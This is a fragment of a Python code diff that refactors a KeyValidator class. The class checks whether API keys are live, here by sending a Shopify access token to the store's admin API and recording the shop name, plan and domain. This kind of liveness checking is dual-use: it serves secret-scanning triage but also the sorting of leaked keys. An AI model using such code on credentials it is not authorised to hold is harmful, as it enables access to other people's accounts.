+                result.confidence = 0.9
+                result.account_info["note"] = "Rate limited but key is valid"
+            else:
+                result.error = f"HTTP {resp.status}"
 
     async def _validate_shopify(
         self, result: KeyValidation, extra: Dict
@@ -1078,23 +1099,23 @@ class KeyValidator:
             return
         if not store.endswith(".myshopify.com"):
             store = f"{store}.myshopify.com"
-        async with aiohttp.ClientSession() as session:
-            headers = {"X-Shopify-Access-Token": result.key_full}
-            async with session.get(
-                f"https://{store}/admin/api/2024-01/shop.json",
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-            ) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    shop = data.get("shop", {})
-                    result.is_live = True
-                    result.confidence = 1.0
-                    result.account_info["shop_name"] = shop.get("name", "")
-                    result.account_info["plan"] = shop.get("plan_name", "")
-                    result.account_info["domain"] = shop.get("domain", "")
-                elif resp.status == 401:
-                    result.is_live = False
-                    result.confidence = 1.0
-                else:
-                    result.error = f"HTTP {resp.status}"
+        session = await self._get_session()
+        headers = {"X-Shopify-Access-Token": result.key_full}
+        async with session.get(
+            f"https://{store}/admin/api/2024-01/shop.json",
+            headers=headers,
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+        ) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                shop = data.get("shop", {})
+                result.is_live = True
+                result.confidence = 1.0
+                result.account_info["shop_name"] = shop.get("name", "")
+                result.account_info["plan"] = shop.get("plan_name", "")
+                result.account_info["domain"] = shop.get("domain", "")
+            elif resp.status == 401:
+                result.is_live = False
+                result.confidence = 1.0
+            else:
+                result.error = f"HTTP {resp.status}"
